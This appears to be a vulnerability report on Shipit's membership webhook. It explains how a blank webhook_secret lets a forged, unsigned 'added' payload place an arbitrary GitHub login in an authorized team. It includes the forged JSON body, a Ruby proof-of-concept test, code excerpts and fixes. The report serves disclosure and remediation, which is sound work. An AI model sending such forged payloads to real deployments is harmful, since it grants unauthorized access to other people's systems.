### Title
Membership webhook trusts `params.member.login` verbatim, allowing arbitrary account escalation into `Shipit.github_teams` when the target organization has no `webhook_secret` configured - (File: app/models/shipit/webhooks/handlers/membership_handler.rb)

### Summary
`MembershipHandler#process` calls `User.find_or_create_by_login!(params.member.login)` and adds that user to the corresponding `Team` on any `'added'` action, with zero re-verification of `params.member.login` against the party GitHub actually granted membership to. When the target organization's `Shipit.github_teams` entry has a blank `webhook_secret`, `GitHubApp#verify_webhook_signature` unconditionally returns `true`, so anyone can POST a forged `membership` payload naming an arbitrary victim login and grant that account entry into a configured `Shipit.github_teams` team.

### Finding Description
The binding the question describes: `params.member.login` (verified payload) == the GitHub identity that GitHub itself reported as added to the team. In code, this binding is enforced *only* by HMAC signature verification, not by any application-level cross-check.

- `verify_webhook_signature` in [1](#0-0)  returns `true` immediately if `webhook_secret` is blank for that organization's config, i.e. signature checking is entirely skipped, and otherwise HMAC-validates the raw body.
- `WebhooksController#verify_signature` resolves the app via `Shipit.github(organization: repository_owner)` and calls this method with the raw request body and `X-Hub-Signature` header, `head(422)` only when `verified` is `false` [2](#0-1) .
- `MembershipHandler#process` then unconditionally does `member = User.find_or_create_by_login!(params.member.login)` and, for `action == 'added'`, `team.add_member(member)`, with no verification tying `params.member.login` to any authenticated caller [3](#0-2) .
- `User#authorized?` grants access whenever `teams.where(id: Shipit.github_teams.map(&:id)).exists?` [4](#0-3) , so membership in the `Team` record created above is sufficient for the OAuth login flow to treat the victim login as authorized.

**Root cause**: the only guard between an attacker-controlled JSON body and a database write that grants Shipit authorization is HMAC signature verification, and that guard is a no-op whenever the operator has not configured `webhook_secret` for the targeted GitHub organization in `Shipit.github_teams`.

**Exploit flow**: For an org configured in `Shipit.github_teams` with a blank `webhook_secret`, POST to `/webhooks` with header `X-Github-Event: membership` and body:
```json
{"action":"added","team":{"id":<known team id>,"name":"...","slug":"...","url":"..."},"organization":{"login":"<org>"},"member":{"login":"victim"}}
```
No `X-Hub-Signature` needs to be valid (or present at all) since `verify_webhook_signature` short-circuits `true`. This creates/finds `User(login: "victim")` and adds a `Membership` row into the configured `Team`, satisfying `authorized?` for that account without the victim's consent or any GitHub-side action.

**Why this only applies under a specific precondition**: this is not exploitable against any org that has `webhook_secret` set (the normal, documented configuration), since then HMAC verification correctly rejects forged/unsigned payloads. The vulnerability is real code behavior in the engine (`return true unless webhook_secret`), but it is only reachable if the operator has left `webhook_secret` blank for a `Shipit.github_teams`-bearing GitHub App/organization config — a misconfiguration, not the default or recommended state.

### Impact Explanation
If triggered, an unprivileged attacker can grant Shipit authorization (membership in a `Shipit.github_teams` team) to any GitHub login of their choosing, including logins they do not control, without that login's owner consenting. Since `User#authorized?` gates login/session access application-wide, this is an authorization escalation impacting every stack/tenant governed by `Shipit.github_teams` in that instance — matching the "High: escalation into `Shipit.github_teams` authorization" category. The attack is repeatable per-request and not scoped to a single repository/stack.

### Likelihood Explanation
Exploitability strictly requires the specific organization entry in `Shipit.github_teams` to have `webhook_secret` blank/unset — contrary to the setup documentation's expectation that a secret is configured per app. Given that precondition, attacker cost is a single unauthenticated HTTP POST with a guessed/known GitHub team ID and organization login (both discoverable via GitHub's API for teams the attacker can see, or by reconnaissance), no Shipit credentials required. Likelihood is entirely contingent on this operator misconfiguration; it is not exploitable against a correctly configured instance.

### Recommendation
- Make `Shipit.github(organization:)` refuse to load / fail closed (reject all webhooks) for organizations with a blank `webhook_secret` rather than silently trusting all events (i.e., change `verify_webhook_signature` to return `false`, not `true`, when `webhook_secret` is blank), or make `webhook_secret` a required, validated config field at boot.
- Additionally, defense-in-depth: in `MembershipHandler`, avoid trusting `params.member.login` as sufficient to mutate authorization state without further corroboration (e.g., require signature verification to always be enforced for authorization-affecting events, independent of a general opt-out).

### Proof of Concept
```ruby
test ":membership escalates arbitrary login into github_teams when webhook_secret is blank" do
  Shipit.stubs(:github_teams).returns([shipit_teams(:the_team)]) # a team configured for authorization
  github_app = Shipit.github(organization: 'shopify')
  github_app.instance_variable_set(:@webhook_secret, nil) # simulate blank webhook_secret config

  @request.headers['X-Github-Event'] = 'membership'
  # no X-Hub-Signature header sent at all
  post :create, body: {
    action: 'added',
    team: { id: shipit_teams(:the_team).github_id, name: 'x', slug: 'x', url: 'https://x' },
    organization: { login: 'shopify' },
    member: { login: 'victim' }
  }.to_json, as: :json

  assert_response :ok
  victim = User.find_by(login: 'victim')
  assert victim
  assert victim.authorized?, "attacker-named login was escalated into Shipit.github_teams without consent"
end
```
This demonstrates: LHS (`params.member.login` == `"victim"`, attacker-chosen, never authenticated) vs RHS (real GitHub identity that GitHub reports as added) diverge, and no code path re-establishes the equality before `team.add_member(member)` executes.

### Citations

**File:** lib/shipit/github_app.rb (L76-83)
```ruby
    def verify_webhook_signature(signature, message)
      return true unless webhook_secret

      algorithm, signature = signature.split("=", 2)
      return false unless algorithm == 'sha1'

      SecureCompare.secure_compare(signature, OpenSSL::HMAC.hexdigest(algorithm, webhook_secret, message))
    end
```

**File:** app/controllers/shipit/webhooks_controller.rb (L24-38)
```ruby
    def verify_signature
      github_app = Shipit.github(organization: repository_owner)
      verified = github_app.verify_webhook_signature(
        request.headers['X-Hub-Signature'],
        request.raw_post
      )
      head(422) unless verified

      Rails.logger.info([
        'WebhookController#verify_signature',
        "event=#{event}",
        "repository_owner=#{repository_owner}",
        "signature=#{request.headers['X-Hub-Signature']}",
        "status=#{status}"
      ].join(' '))
```

**File:** app/models/shipit/webhooks/handlers/membership_handler.rb (L22-33)
```ruby
        def process
          team = find_or_create_team!
          member = User.find_or_create_by_login!(params.member.login)

          case params.action
          when 'added'
            team.add_member(member)
          when 'removed'
            team.members.delete(member)
          else
            raise ArgumentError, "Don't know how to perform action: `#{action.inspect}`"
          end
```

**File:** app/models/shipit/user.rb (L80-82)
```ruby
    def authorized?
      @authorized ||= Shipit.github_teams.empty? || teams.where(id: Shipit.github_teams.map(&:id)).exists?
    end
```
